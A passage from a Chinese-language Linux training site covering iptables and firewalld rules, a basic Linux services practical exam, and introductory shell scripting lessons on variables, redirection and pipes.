<li>开机后重新导入    <code>iptables-restore &lt; /etc/sysconfig/iptables</code></li>
</ol>
<blockquote>
<p>只允许172.25.0.250和你自己的服务器能够访问ftp服务（rhel6）</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 172.25.0.250 -p tcp --dport 21 -j  ACCEPT</span><br><span class="line">iptables -A INPUT -s 172.25.0.11 -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j DROP</span><br></pre></td></tr></table></figure>


<blockquote>
<p>禁止ping包</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp -j DROP</span><br></pre></td></tr></table></figure>

<blockquote>
<p>仅允许172.25.0.0/24网段和172.25.15.0/24网段用户能够访问我的邮件服务器</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 172.25.0.0/24 -p tcp --dport 25 -j ACCEPT</span><br><span class="line">iptables -A INPUT -s 172.25.15.0/24 -p tcp --dport 25 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 25 -j DROP</span><br></pre></td></tr></table></figure>

<h3 id="课堂练习题目"><a href="#课堂练习题目" class="headerlink" title="课堂练习题目"></a>课堂练习题目</h3><p>rhel6 172.25.x.11</p>
<ol>
<li><p>清空规则</p>
</li>
<li><p>预设filter表INPUT是ACCEPT</p>
</li>
<li><p>仅允许172.25.254.250和172.25.254.X 能够ssh到我的服务器（rhel6 172.25.X.11）上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 172.25.254.250 -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -s 172.25.254.16 -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</span><br></pre></td></tr></table></figure>
</li>
<li><p>仅允许172.25.254.0/24和172.25.X.0/24能够ping我的服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 172.25.254.0/24 -p icmp -j ACCEPT</span><br><span class="line">iptables -A INPUT -s 172.25.16.0/24 -p icmp -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icpm -j DROP</span><br></pre></td></tr></table></figure>
</li>
<li><p>不允许172.25.254.254访问我的邮件服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 172.25.254.254 -p tcp --dport 25 -j DROP</span><br></pre></td></tr></table></figure>
</li>
<li><p>保存规则</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rhel6</span><br><span class="line">servcie iptables save</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure></li>
<li><p>查看规则</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure>
</li>
<li><p>关机重启</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables-restore &lt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="Firewalld的用法"><a href="#Firewalld的用法" class="headerlink" title="Firewalld的用法"></a>Firewalld的用法</h3><p>Firewalld是el7默认的防火墙，和iptables冲突，如果要使用其中之一，需要关闭另外一个</p>
<p>运行、停止、禁用firewalld:</p>
<ul>
<li>启动：<code>systemctl start  firewalld</code></li>
<li>查看状态：<code>systemctl status firewalld</code> 或者 <code>firewall-cmd --state</code></li>
<li>停止：<code>systemctl disable firewalld</code></li>
<li>禁用：<code>systemctl stop firewalld</code></li>
</ul>
<p>可以通过</p>
<ol>
<li>firewall-config图形化工具 来控制</li>
<li>firewall-cmd  命令行工具</li>
</ol>
<h4 id="Firewall-config"><a href="#Firewall-config" class="headerlink" title="Firewall-config"></a>Firewall-config</h4><ol>
<li>Configuration    runtime和permanent  分别是运行时和永久</li>
<li>zone 默认区域配置</li>
</ol>
<ul>
<li>Trusted：允许所有传入数据包</li>
<li>drop：默认丢弃所有包</li>
<li>block：拒绝所有外部连接，允许内部发起的连接</li>
<li>public：指定外部连接可以进入</li>
<li>external：这个不太明白，功能上和上面相同，允许指定的外部连接</li>
<li>dmz：和硬件防火墙一样，受限制的公共连接可以进入</li>
<li>work：工作区，概念和workgoup一样，也是指定的外部连接允许</li>
<li>home：类似家庭组</li>
<li>internal：信任所有连接</li>
</ul>
<ol start="3">
<li>富规则：可用于表达基本的允许和拒绝规则。<br>Configuration  permenent</li>
</ol>
<p><img src="pic/21.png" alt="21"></p>
<p>左上角：Option  reloade firewall<br>Ssh就无法登陆了</p>
<h4 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-rich-rule=\'rule family=ipv4 service name="ssh" source address=192.168.137.11 log prefix="ssh" level="notice" limit value="3/m" reject\'</span><br></pre></td></tr></table></figure>

<p>将来自于192.168.137.11的ssh拒绝掉，并且将notice以上的日志写入到ssh日志当中，限制每分钟最多三条记录。</p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux简易服务上机考试</title>
    <url>/2016/12/23/booboo_easy_service/ule-online/</url>
    <content><![CDATA[<p>##　注意事项</p>
<ol>
<li>确保在重启主机后所有配置仍然生效。</li>
<li>selinux必须为Enforing模式，防火墙必须开始。默认策略必须清空。</li>
<li>设置主机名为 stuXXX（“X”为你的 foundation 机器 ip 地址最后一位。例如：你的 ip 地址为172.25.254.30，则你的主机名为stu30）</li>
<li>不允许ssh登录到其他主机，已经发现按0分计算考试得分。</li>
<li>考试满分为100分制，70分为及格，90分为优秀，所有考题需要按照要求完成。</li>
</ol>
<h2 id="考试内容"><a href="#考试内容" class="headerlink" title="考试内容"></a>考试内容</h2><h3 id="find查找文件"><a href="#find查找文件" class="headerlink" title="find查找文件"></a>find查找文件</h3><p>使用find查找/etc目录下文件名以.conf结尾的文件，并将其复制到/tmp/etc目录下。（10分）</p>
<p>###　autofs自动挂载　</p>
<p>配置autofs，当执行cd /opt/server 时，系统自动将172.25.254.250:/content 挂载到此目录。（10分）</p>
<h3 id="用户和组的管理"><a href="#用户和组的管理" class="headerlink" title="用户和组的管理"></a>用户和组的管理</h3><p>创建test1 test2 test3用户，uid=gid分别为801 802 803，将他们加入到test组（本机无test用户），组test为这些用户的附加组。创建/tmp/test目录，该目录只有test1 test2 test3用户可读写，（root不受限制）。该目录下所创建文件group将自动改变为test组，该目录下文件只有owner可删除。（10分）</p>
<h3 id="Apache搭建网站服务"><a href="#Apache搭建网站服务" class="headerlink" title="Apache搭建网站服务"></a>Apache搭建网站服务</h3><h4 id="基于名称的虚拟主机"><a href="#基于名称的虚拟主机" class="headerlink" title="基于名称的虚拟主机"></a>基于名称的虚拟主机</h4><p>创建两个基于名称的虚拟主机网站<a href="http://www.test.com和www.stuXXX.com" target="_blank" rel="noopener">www.test.com和www.stuXXX.com</a></p>
<h4 id="DNS域名解析服务"><a href="#DNS域名解析服务" class="headerlink" title="DNS域名解析服务"></a>DNS域名解析服务</h4><p>配置相应的DNS正、反解析,网站的默认首页内容分别为 <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a> 和<a href="http://www.stuXXX.com。（10分）" target="_blank" rel="noopener">www.stuXXX.com。（10分）</a></p>
<h4 id="LVM逻辑卷管理"><a href="#LVM逻辑卷管理" class="headerlink" title="LVM逻辑卷管理"></a>LVM逻辑卷管理</h4><p>制作两个lv，/dev/vg_web/lv_test 和/dev/vg_web/lv_stu。每个逻辑卷200M。分别作为以/var/www/test.com 和 /var/www/stuXXX.com上两个虚拟主机的主目录(Document root)(10分)</p>
<h4 id="web页面身份认证"><a href="#web页面身份认证" class="headerlink" title="web页面身份认证"></a>web页面身份认证</h4><p>配置页面身份认证，使<a href="http://www.stuXXX.com" target="_blank" rel="noopener">www.stuXXX.com</a> 必须通过用户名jack，密码uplooking验证才能访问。（10分）</p>
<h3 id="Samba文件共享服务"><a href="#Samba文件共享服务" class="headerlink" title="Samba文件共享服务"></a>Samba文件共享服务</h3><p>配置samba，使user1（自己新建）用户密码为redhat，可以通过smbclient上传下载文件到自己的家目录和/samba（自己新建）目录，/samba共享名为pub。（10分</p>
<h3 id="FTP文件共享服务"><a href="#FTP文件共享服务" class="headerlink" title="FTP文件共享服务"></a>FTP文件共享服务</h3><p>配置vsftpd使student用户可以通过ftp上传下载文件自己家目录中的文件，同时对student用户启用chroot功能，并且允许匿名用户上传文件到/var/ftp/test目录下。（10分）</p>
<h3 id="周期性计划任务"><a href="#周期性计划任务" class="headerlink" title="周期性计划任务"></a>周期性计划任务</h3><p>对 natasha 用户配置计划任务,要求在本地时间的每天 14:23 分执行以下命令 （10分）</p>
<p>/bin/echo “hi uplooking”</p>
<h3 id="iptables防火墙"><a href="#iptables防火墙" class="headerlink" title="iptables防火墙"></a>iptables防火墙</h3><p>iptables（10分）</p>
<ol>
<li>清空iptables filter表的默认策略（2分）</li>
<li>只允许172.25.0.250和你使用自己搭建的的ftp服务（2分）</li>
<li>禁止ping包（2分）</li>
<li>仅允许172.25.0.0/24网段和你自己的网段用户访问你的web服务器（2分）</li>
<li>保存iptables配置（2分）</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX Shell Scripts 第一课 简介和变量</title>
    <url>/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/</url>
    <content><![CDATA[<h2 id="教学环境介绍"><a href="#教学环境介绍" class="headerlink" title="教学环境介绍"></a>教学环境介绍</h2><ul>
<li>client rhel7.2 172.25.0.10</li>
<li>server rhel7.2 172.25.0.11</li>
</ul>
<p>如果真的想走IT这条路，想真正管理好你的主机，那么学习自动化管理工具Shell Scripts 非常重要！</p>
<p>就是将一些命令放在一起去执行，并且不需要编译就能执行，很方便，所以在日常工作中可以用shell scripts来简化我们的管理。可以但到我们linux中，很多服务的启动都是透过shell脚本来启动的。</p>
<p>如果你不会脚本，那么服务器出问题的时候，真的会求助无门，所以好好地学习吧！</p>
<h2 id="shell-简介"><a href="#shell-简介" class="headerlink" title="shell 简介"></a>shell 简介</h2><h3 id="什么是-shell"><a href="#什么是-shell" class="headerlink" title="什么是 shell"></a>什么是 shell</h3><p>Shell 是一个命令解释器 , 是人与操作系统之间的桥梁。</p>
<p><img src="pic/03.png" alt="03.png"></p>
<p>我们平时无论任何操作 , 最终都要操作硬件 , 比如输入一个字符 “ a ”, 那么信号 首先会从键盘传递到主板 , 通过主板总线传递到内存 ,CPU, 显卡等 , 最终经过显卡的运 算完成后在屏幕的某个位置 , 显示一个特定字体的字符 “a ”, 这一整个过程可以说是 不断的和硬件打交道了 , 但是如果让人去发送这些硬件操作码显然不适合 , 因为这不是人干 的事 , 所以我们有了操作系统 , 操作系统通过加载一定的硬件驱动 , 从而控制硬件 , 操作硬 件 , 那剩下的事就是如何和操作系统通信了 , 对于普通的系统管理员来说 , 这也是一件非常 困难的事 , 为了方便人和操作系统沟通 , 我们开发了 shell 。</p>
<p>Shell 可以将我们平时运行的一些指令解释给操作系统执行 , 方便管理员操作系统。 而 Shell 的脚本其实是一种命令的堆积 , 我们将所有需要执行的命令 , 以从上至下的方 式写在一个文件当中 , 交给 shell 去自动解释执行。</p>
<h3 id="shell-历史"><a href="#shell-历史" class="headerlink" title="shell 历史"></a>shell 历史</h3><p>在 AT&amp;T 的 Dennis Ritchie 和 Ken Thompson 设计 UNIXTM 的时候 , 他们想要为 用户创建一种与他们的新系统交流的方法。 那时的操作系统带有命令解释器。命令解释器接受用户的命令 , 然后解释它们 , 因而计 算机可以使用这些命令。</p>
<p>但是 Ritchie 和 Thompson 想要的不只是这些功能 , 他们想提供比当时的命令解释器 具备更优异功能的工具。这导致了 Bourne shell( 通称为 sh) 的开发 , 由 S.R. Bourne 创 建。自从 Bourne shell 的创建 , 其它 shell 也被一一开发 , 如 C shell(csh) 和 Korn shell(ksh) 。</p>
<p>当自由软件基金会想寻求一种免费的 shell, 开发者们开始致力于 Bourne shell 以及当 时其它 shell 中某些很受欢迎的功能背后的语言。</p>
<p>这个开发结果是 Bourne Again Shell, 或称 bash 。虽然你的 Red Hat Linux 包括几 种不同的 shell,bash 是为互动用户提供的默认 shell 。</p>
<h3 id="常见的-shell"><a href="#常见的-shell" class="headerlink" title="常见的 shell"></a>常见的 shell</h3><ul>
<li>Bourne shell 即 sh:AT&amp;T 贝尔实验室编写的一个交换式的命令解释器。</li>
<li>C Shell :Bill Joy 于 20 世纪 80 年代早期开发。为了让用户更容易的使用 , 他把语法 结构变成了 C 语言风格。它新增了命令历史、别名、文件名替换、作业控制等功能。</li>
<li>korn shell (ksh) 是一个 Unix shell 。它由贝尔实验室的 David Korn 在二十世纪八十 年代早期编写。它完全向上兼容 Bourne shell 并包含了 C shell 的很多特性。</li>
<li>Bourne-Again Shell: bash 是一个为 GNU 项目编写的 Unix shell 。它的名字是一 系列缩写 :Bourne-Again SHell — 这是关于 Bourne shell(sh) 的一个双关语 (Bourne again / born again) 。 Bourne shell 是一个早期的重要 shell, 由 Stephen Bourne 在 1978 年前后编写 , 并同 Version 7 Unix 一起发布。 bash 则在1987 年由 Brian Fox 创造。 在 1990 年 ,Chet Ramey 成为了主要的维护者。 bash 是大多数 Linux 系统以及 Mac OS X v10.4 默认的 shell, 它能运行于大多数 Unix 风格的操作系统之上 , 甚至被移植到了 MicrosoftWindows 上的 Cygwin 和 MSYS 系统中 , 以实现 windows 的 POSIX 虚拟接口。此外 , 它也被 DJGPP 项目移植到了 MS- DOS 上。</li>
<li>POSIX shell :POSIX shell 与 Korn shell 非常的相似 , 当前提供 POSIX shell 的最 大卖主是 Hewlett-Packard 。</li>
</ul>
<h3 id="为什么-Shell"><a href="#为什么-Shell" class="headerlink" title="为什么 Shell"></a>为什么 Shell</h3><ul>
<li>解决重复操作的作业。</li>
<li>节约时间 , 提高工作效率。</li>
<li>功能强大 , 使用简单。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.查看系统当中合法的shell</span></span><br><span class="line">cat /etc/shells</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># /etc/shells: valid login shells</span></span><br><span class="line">    /bin/sh</span><br><span class="line">    /bin/dash</span><br><span class="line">    /bin/bash</span><br><span class="line">    /bin/rbash</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2.修改用户登录时使用的shell程序</span></span><br><span class="line">useradd batman</span><br><span class="line">chsh -s /bin/sh batman</span><br><span class="line">grep batman /etc/passwd</span><br></pre></td></tr></table></figure>

<pre><code>useradd: Permission denied.
useradd: cannot lock /etc/passwd; try again later.
chsh: user &apos;batman&apos; does not exist</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3.用户的登录流程</span></span><br><span class="line"></span><br><span class="line">![01](pic/01.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 对于所有的用户HISTSIZE 500 ，对于root用户HISTSIZE 1000</span></span><br><span class="line">/etc/profile start</span><br><span class="line">/etc/profile end</span><br><span class="line"></span><br><span class="line">~/.bash_profile start</span><br><span class="line">~/.bashrc start</span><br><span class="line">/etc/bashrc start</span><br><span class="line"></span><br><span class="line">/etc/bashrc end</span><br><span class="line">~/.bashrc end</span><br><span class="line">~/.bash_profile end</span><br></pre></td></tr></table></figure>

<h2 id="shell的变量功能"><a href="#shell的变量功能" class="headerlink" title="shell的变量功能"></a>shell的变量功能</h2><h3 id="什么是变量"><a href="#什么是变量" class="headerlink" title="什么是变量"></a>什么是变量</h3><ul>
<li>让一个特定的字符代表不固定的内容，有点像y=ax+b,y就是变量，</li>
<li>用简单的字眼来代替比较复杂或者容易变动的数据，好处就是方便！</li>
</ul>
<p>比如系统中的MAIL和USER变量，根据当前登陆的用户而变化</p>
<ul>
<li>对脚本的用处——例如ule考试的评分脚本，根据你们的机器号的不同，去检测不同的学生考试成绩</li>
</ul>
<h3 id="变量的设置、查看和取消-echo-unset"><a href="#变量的设置、查看和取消-echo-unset" class="headerlink" title="变量的设置、查看和取消 echo unset"></a>变量的设置、查看和取消 echo unset</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">        查看	echo $&#123;MAIL&#125;</span><br><span class="line">			echo $MAIL</span><br><span class="line">		设置	变量名=变量的内容</span><br><span class="line">				myname=booboo</span><br><span class="line">				myname="booboo wei"</span><br><span class="line">			注意事项</span><br><span class="line">				变量命名规则：</span><br><span class="line">					1.由数字，字母，下划线_组成</span><br><span class="line">					2.不能以数字开头</span><br><span class="line">					3.字母区分大小写，大小写敏感</span><br><span class="line">				变量内容若有空格，可以使用单引号或者双引号</span><br><span class="line">					双引号保留特殊字符原有属性</span><br><span class="line">					单引号特殊字符变一般字符（纯文本）</span><br><span class="line">					也可使用\跳脱字符将特殊字符变成一般字符</span><br><span class="line">				`指令`或$(指令)可以将指令的结果变成变量内容</span><br><span class="line">		取消	unset 变量名</span><br><span class="line">				unset myname</span><br><span class="line">```                </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 课堂练习</span></span></span><br><span class="line">			1. 设置变量myname=superman并查看变量的值；</span><br><span class="line">			2. 设置变量myname1=I am superman</span><br><span class="line">				myname2="I am superman"</span><br><span class="line">				myname3='I am superman'并查看所有变量的值；</span><br><span class="line">			3. 设置两个变量分别为name1="$myname is myname"和name2='$myname is myname';并查看变量的值；</span><br><span class="line">			4. 设置变量kernel的值为当前系统的内核版本号；</span><br><span class="line">			5. 设置变量num的值为/etc/目录下所有以.conf结尾的文件的总数；</span><br><span class="line">			6. 取消练习中的有所变量。</span><br><span class="line"></span><br><span class="line">![02](pic/02.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 变量内容的删除和替换</span></span></span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">		变量设定方式		说明</span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量<span class="comment">#关键词&#125;		若变量内容从头开始的数据符合『关键词』,则将符合的最短数据删除</span></span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量<span class="comment">##关键词&#125; 		若变量内容从头开始的数据符合『关键词』,则将符合的最长数据删除</span></span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量%关键词&#125; 		若变量内容从尾向前的数据符合『关键词』,则将符合的最短数据删除</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量%%关键词&#125;		若变量内容从尾向前的数据符合『关键词』,则将符合的最长数据删除</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量/旧字符串/新字符串&#125; 	若变量内容符合『旧字符串』则『第一个旧字符串会被新字符串替换』</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">&#123;变量//旧字符串/新字符串&#125;	若变量内容符合『旧字符串』则『全部的旧字符串会被新字符串替换』</span></span><br></pre></td></tr></table></figure>


<h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
<li>设置变量path=${PATH} 并查看；</li>
<li>设置变量path=/batman/bin:${path}:/superman/bin 并查看；</li>
<li>读取变量的时候将/batman/bin:及第一个冒号及之前的删除；</li>
<li>读取变量的时候将最后一个冒号及之前的都删除；</li>
<li>读取变量的时候将:/superman/bin及最后一个冒号及之后的删除；</li>
<li>读取变量的时候将第一个冒号及之后的都删除；</li>
<li>读取变量的时候将第一个sbin替换成SBIN；</li>
<li>读取变量的时候将所有的sbin替换成SBIN；</li>
<li>取消练习中的path变量。</li>
</ol>
<h3 id="变量的分类：局部变量和全局变量-env-set-export"><a href="#变量的分类：局部变量和全局变量-env-set-export" class="headerlink" title="变量的分类：局部变量和全局变量 env set export"></a>变量的分类：局部变量和全局变量 env set export</h3><ul>
<li>分类标准    变量是否会被子程序所继续引用；局部变量不会；全局变量会</li>
<li>env     列出目前shell环境下的所有全局变量</li>
<li>set     查看所有变量，包括环境变量和局部变量</li>
<li>export    将局部变量转成全局变量    export myname</li>
</ul>
<h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 打开一个终端bash，查看该终端的pid号；
2. 设置本地变量justice1=&quot;this is local&quot;并查看;
3. 设置环境变量justice2=&quot;this is env&quot;并查看;
4. 打开子终端bash，查看该终端的pid号和ppid号；
5. 在子终端中分别查看变量justice1和justice2的值；</code></pre><h3 id="变量读取、数组与宣告-read-array-declare"><a href="#变量读取、数组与宣告-read-array-declare" class="headerlink" title="变量读取、数组与宣告 read array declare"></a>变量读取、数组与宣告 read array declare</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">read	从键盘读取数据存入变量</span><br><span class="line">	read -p "plz input yourname:" -t 30 name 按下回车输入变量name的值，会等待30s结束</span><br><span class="line">array</span><br><span class="line">	数组的设定	A[0]=1;A[1]=2;A[2]=3</span><br><span class="line">			A=(1 2 3)</span><br><span class="line">			A=(1 2 3 [50]=4)</span><br><span class="line">			A=(1 2 3 [50]=4 5)</span><br><span class="line">	数组的读取	echo $&#123;A[0]&#125;</span><br><span class="line">			echo $&#123;A[@]&#125;</span><br><span class="line">			echo $&#123;A[*]&#125;</span><br><span class="line">			* 代表的是一次取出所有的值 ,@ 代表依次取值</span><br><span class="line">				for i in "$A[@]";do echo $i;done</span><br><span class="line">				for i in "$A[*]";do echo $i;done</span><br><span class="line">declare</span><br><span class="line">	declare 参数</span><br><span class="line">		-a 将变量看成数组</span><br><span class="line">		-i 将变量看成整数</span><br><span class="line">		-r 使变量只读</span><br><span class="line">	x=1</span><br><span class="line">	y=2</span><br><span class="line">	sum=$(($x+$y))</span><br></pre></td></tr></table></figure>

<h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 用read命令从键盘读取num变量的值，提示语句为“请输入你的机器号：”，限时间20s；
2. 设置数组S 第一位为1，第二位为2，第三十位为4，第三十一位为5，读取数组所有的值，读取数组第二位；
3. 设置变量x=1，y=2，变量sum=$x+$y，查看sum的值；
4. 宣告变量x为整数型值为1，变量y为整数型值为2,变量sum为整数型=$x+$y，查看sum的值；</code></pre><h2 id="数据流重导向redirection"><a href="#数据流重导向redirection" class="headerlink" title="数据流重导向redirection"></a>数据流重导向redirection</h2><h3 id="何谓数据流重导向"><a href="#何谓数据流重导向" class="headerlink" title="何谓数据流重导向"></a>何谓数据流重导向</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">指令执行后的结果有：</span><br><span class="line">          exit    命令执行是否正确的返回值?	0正确；！0错误		简称	代码	符号</span><br><span class="line">          return	命令执行输出的正确信息	standard output		    stdout	1	&gt;或者&gt;&gt;</span><br><span class="line">			命令执行输出的错误信息	standard error output	stderr	2	2&gt;或者2&gt;&gt;</span><br><span class="line">指令执行前的输入：		命令执行输入的信息		standard in		stdin	0	&lt;或者&lt;&lt;</span><br><span class="line"></span><br><span class="line">用法总结			</span><br><span class="line"><span class="meta">	1&gt;</span><span class="bash"> :以覆盖的方法将『正确的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">	1&gt;</span><span class="bash">&gt;:以追加的方法将『正确的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">	2&gt;</span><span class="bash"> :以覆盖的方法将『错误的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">	2&gt;</span><span class="bash">&gt;:以追加的方法将『错误的数据』输出到指定的文件中；</span></span><br><span class="line"></span><br><span class="line">cat	从键盘读取数据存入文件</span><br><span class="line">	cat &gt; /tmp/catfile 以ctrl+d结束</span><br><span class="line">	cat &gt; /tmp/catfile &lt; /tmp/passwd</span><br><span class="line">	cat &gt; /tmp/catfile &lt;&lt; ENDF</span><br><span class="line">	standard in</span><br><span class="line">	ENDF===&gt;结束提示符</span><br></pre></td></tr></table></figure>

<h4 id="课堂练习-3"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 查看系统/目录下的所有文件名和属性，并记录到/tmp/file文件中；
2. 查看系统/var/目录下的所有文件名和属性，并追加记录到/tmp/file文件中；
3. 切换到student用户，在/home目录下查找文件名为.bashrc的文件是否存在；
4. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息显示到屏幕上，将该命令执行输出的错误信息放到黑洞/dev/null中；
5. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中并查看，将该命令执行输出的错误信息放到黑洞/dev/null中；
6. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中，将该命令执行输出的错误信息保存到/tmp/stderr文件中，并查看；
7. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的所有信息（正确和错误）都保存到/tmp/all中，并查看；
8. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件；
9. 使用cat命令将/etc/passwd/的内容覆盖/tmp/catfile文件；
10. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件，以结束提示符的方式结束；</code></pre><h3 id="命令执行的判断依据-amp-amp"><a href="#命令执行的判断依据-amp-amp" class="headerlink" title="命令执行的判断依据 ; &amp;&amp; ||"></a>命令执行的判断依据 ; &amp;&amp; ||</h3><ul>
<li>CMD1 &amp;&amp; CMD2     如果前一个命令 (CMD1) 能够正确被执行 , 则执行后一个命令 (CMD2)</li>
<li>CMD1 || CMD2     如果前一个命令 (CMD1) 被正确执行 , 则不执行后一个命令 (CMD2), 如果前一个命令(CMD1) 执行错误 , 则执行后一个命令 (CMD2).</li>
<li>CMD1 ; CMD2    命令之间没有关系，从第一个开始执行，不管是否正确执行都会去执行第二个命令</li>
</ul>
<h4 id="课堂实验"><a href="#课堂实验" class="headerlink" title="课堂实验"></a>课堂实验</h4><pre><code>1. 创建目录/tmp/cmd,如果创建成功那么就再创建一个目录/tmp/cmd/cdm1;
2. 创建目录/tmp/cmd,如果创建失败，那么就再船舰一个目录/tmp/cmd/cmd2;
3. 不管目录/tmp/cmd是否创建成功，都会去再创建一个目录/tmp/tmpcmd;</code></pre><h3 id="管道命令pipe"><a href="#管道命令pipe" class="headerlink" title="管道命令pipe"></a>管道命令pipe</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">   #</span><span class="bash">截取 grep cut</span></span><br><span class="line">	grep bash$ /etc/passwd</span><br><span class="line">	cut -d : -f 3 /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">排序 sort uniq</span></span><br><span class="line">	sort -t: -k3 -n /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">统计 wc</span></span><br><span class="line">	wc -l /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">替换 xargs</span></span><br><span class="line">	find /sbin/ -perm +7000|wc -l</span><br><span class="line">	find /sbin/ -perm +7000|xargs wc -l</span><br><span class="line"></span><br><span class="line">	课堂练习：</span><br><span class="line">	1.找出/sbin/目录下有特殊权限的文件，并统计每个文件的行数</span><br><span class="line">	2.找出/sbin/目录下有特殊权限的文件，并统计有几个</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">减号 -</span></span><br><span class="line">	课堂练习：</span><br><span class="line">	1.将/home目录打包压缩后解压到/tmp目录</span><br></pre></td></tr></table></figure>



<h3 id="shell下的特殊符号"><a href="#shell下的特殊符号" class="headerlink" title="shell下的特殊符号"></a>shell下的特殊符号</h3><pre><code>#    注释符
\    跳脱符
|    管道
;    连续指令的下达
~    家目录
$    取用变量符
&amp;    进程控制后台运行
!    逻辑运算非
/    根目录
&gt;,&gt;&gt;    数据流重导向 输出
&lt;,&lt;&lt;    数据流重导向 输入
&apos;&apos;    特殊字符失效
&quot;&quot;    特殊字符有效
``    命令执行的结果
{}    命令的组合</code></pre>]]></content>
      <categories>
        <category>技术培训</category>
        <category>LinuxBash脚本教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>LinuxBash脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX Shell Scripts 第二课 流程控制语句</title>
    <url>/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/</url>
    <content><![CDATA[<ol>
<li><p>shell 的基本组成元素</p>
<ul>
<li>1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。</li>
<li>2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。</li>
<li>3&gt; 系统命令 :shell 脚本中运行解释的系统命令。</li>
<li>4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。</li>
<li>5&gt; 流程控制语句 : 判断 , 循环 , 跳转等流程控制。</li>
</ul>
</li>
<li><p>执行脚本的方法</p>
<ul>
<li>1&gt; bash 脚本名称 bash -x 以调试模式来运行脚本</li>
<li>2&gt; ./ 脚本名称 –&gt; 需要对脚本有可执行的权限</li>
</ul>
</li>
<li><p>shell的基本语法</p>
<ul>
<li>条件判断语句     if test</li>
<li>循环语句    for while unitl</li>
<li>其他流程控制     case continue break shift function</li>
</ul>
</li>
</ol>
